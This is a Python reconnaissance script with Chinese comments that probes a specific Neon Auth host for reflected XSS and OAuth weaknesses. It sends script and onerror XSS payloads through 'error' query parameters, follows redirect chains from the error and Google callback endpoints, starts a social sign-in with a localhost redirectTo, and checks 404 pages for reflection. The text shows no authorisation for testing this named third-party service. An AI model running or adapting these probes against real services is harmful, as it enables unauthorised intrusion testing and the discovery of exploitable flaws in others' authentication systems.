# -*- coding: utf-8 -*-
"""neonauth 域 HTML/渲染面探测: 根路径 / error 参数反射 -> XSS 判定
+ POST social 合法 redirectTo 的 OAuth URL/state 分析"""
import http.client, ssl, json, time, urllib.parse

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'

def req(method, path, body=None, headers=None, raw_headers=False):
    conn = http.client.HTTPSConnection(NA, context=ctx, timeout=20)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html,application/json', 'Content-Type': 'application/json'}
    if headers:
        h.update(headers)
    conn.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=h)
    r = conn.getresponse()
    raw = r.read()
    st = r.status
    hdrs = r.headers
    conn.close()
    if raw_headers:
        return st, raw, hdrs
    return st, raw

print('=== [1] 根路径与 error 渲染 ===')
for p in ('/', '/?error=test123', '/?error=%3Cscript%3Ealert(1)%3C/script%3E',
          '/?error=%3Cimg%20src=x%20onerror=alert(1)%3E',
          '/neondb/auth/error?error=state_not_found'):
    st, raw, hdrs = req('GET', p, raw_headers=True)
    ct = hdrs.get('content-type')
    loc = hdrs.get('location')
    print('\nGET %s -> %d  CT=%s' % (p[:60], st, ct))
    if loc:
        print('  Location: %s' % loc[:200])
    print('  body: %s' % raw.decode('utf-8', 'replace')[:300])
    time.sleep(0.3)

print('\n=== [2] 跟随 302(error 链终点内容) ===')
# 手动跟随: /error -> /?error=... 
st, raw, hdrs = req('GET', '/neondb/auth/error?error=%3Cscript%3Ealert(1)%3C/script%3E', raw_headers=True)
loc = hdrs.get('location')
print('error -> %d loc=%s' % (st, loc))
if loc:
    st2, raw2, hdrs2 = req('GET', loc, raw_headers=True)
    print('follow -> %d CT=%s' % (st2, hdrs2.get('content-type')))
    print('  body: %s' % raw2.decode('utf-8', 'replace')[:500])

print('\n=== [3] callback 错误链完整跟随 ===')
st, raw, hdrs = req('GET', '/neondb/auth/callback/google?code=x', raw_headers=True)
loc = hdrs.get('location')
print('callback -> %d loc=%s' % (st, loc))
if loc:
    st2, raw2, hdrs2 = req('GET', loc, raw_headers=True)
    loc2 = hdrs2.get('location')
    print('follow1 -> %d loc=%s CT=%s' % (st2, loc2, hdrs2.get('content-type')))
    if loc2:
        st3, raw3, hdrs3 = req('GET', loc2, raw_headers=True)
        print('follow2 -> %d CT=%s body=%s' % (st3, hdrs3.get('content-type'),
              raw3.decode('utf-8', 'replace')[:400]))

print('\n=== [4] 合法 OAuth 发起(redirectTo=localhost:3000) ===')
st, raw, hdrs = req('POST', '/neondb/auth/sign-in/social',
                    {'provider': 'google', 'redirectTo': 'http://localhost:3000/dash'},
                    {'Origin': 'http://localhost:3000'}, raw_headers=True)
print('POST -> %d CT=%s' % (st, hdrs.get('content-type')))
loc = hdrs.get('location')
body_s = raw.decode('utf-8', 'replace')
if loc:
    print('  Location: %s' % loc[:400])
else:
    print('  body: %s' % body_s[:400])

print('\n=== [5] 404 页面 Content-Type(XSS 反射探测) ===')
for p in ('/neondb/auth/zz_not_exist', '/zz_not_exist', '/neondb/auth/sign-in',
          '/neondb/auth/sign-in/email', '/neondb/auth/error'):
    st, raw, hdrs = req('GET', p, raw_headers=True)
    print('GET %s -> %d CT=%s body=%s' % (p, st, hdrs.get('content-type'),
          raw.decode('utf-8', 'replace')[:100]))
    time.sleep(0.2)
